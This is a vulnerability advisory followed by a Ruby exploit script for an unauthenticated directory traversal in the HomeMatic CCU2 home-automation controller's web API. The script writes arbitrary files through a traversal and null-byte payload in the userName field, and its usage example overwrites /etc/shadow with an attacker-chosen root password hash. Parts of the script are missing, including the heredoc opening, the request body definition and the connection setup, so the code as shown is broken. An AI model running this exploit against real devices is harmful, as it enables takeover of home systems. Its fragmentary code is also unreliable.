# Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.

From the vendor's website ([eQ-3](http://www.eq-3.de/produkte/homematic/zentralen-und-gateways.html)):

"The Homematic Central Control Unit CCU2 is responsible for numerous control, signalling and supervision functions across all areas of the Homematic system. The device includes a browser based user interface to the up the system. It can be controlled in the local network as well as via Internet. The Homematic software offers various configuration and application possibilities, so that there are no limits to creativity for installing your individual smart home."

# Issue Description

While analyzing the implementation of the CCU2's web interface, one Directory Traversal vulnerabilities has been identified, which can be exploited in order to write arbitrary files to the CCU2's filesystem. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.

The system provides a JSON API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.

A code review of the file `api/methods/user/setlanguage.tcl` revealed that the User.setLanguage method, which can be used without authentication, is prone to a Directory Traversal vulnerability. Please consider the following excerpt from the affected code:

```
exec echo $args(userLang)>/etc/config/userprofiles/$args(userName).lang
```

This means that an attacker can create or overwrite arbitrary files on the CCU2's filesystem. Please note that full control over the target file name can be obtained by injecting a null byte into the userName argument in order to prevent the string ".lang" from being appended to the resulting file name. The file contents can be directly controlled via the userLang argument.

# Description: http://atomic111.github.io/article/homematic-ccu2-filewrite

Please provide url

Usage:
  write_files.rb <ip.adress> <file path> <content of the file>

Example:
  write_files.rb https://192.168.1.1 '/etc/shadow' 'root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::'

  or

  write_files.rb http://192.168.1.1 '/etc/shadow' 'root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::'

EOF
  exit
end

# The first argument specifies the URL and if http or https is used
url = ARGV[0] + "/api/homematic.cgi"

# The second argument specifies the file into which the content should be written
homematic_file_path = ARGV[1]

# The third argument specifies the content of the file
homematic_file_content = ARGV[2]

# define the json body for the attack

        }.to_hash

# define the traversal with the file you want to write
body[:params][:userName] = "../../../../../../../.." + homematic_file_path + "\u0000"

# define the content
body[:params][:userLang] = homematic_file_content

# split the uri to access it in a easier way
uri = URI.parse(url)

# define target connection, disabling certificate verification

  request = Net::HTTP::Post.new(uri.request_uri)

  # define the content type of the http request
  request.content_type = 'application/json'

  # define the request body

  # send the request to the homematic ccu2
  response = http.request(request)

  # print response message code and status to cli
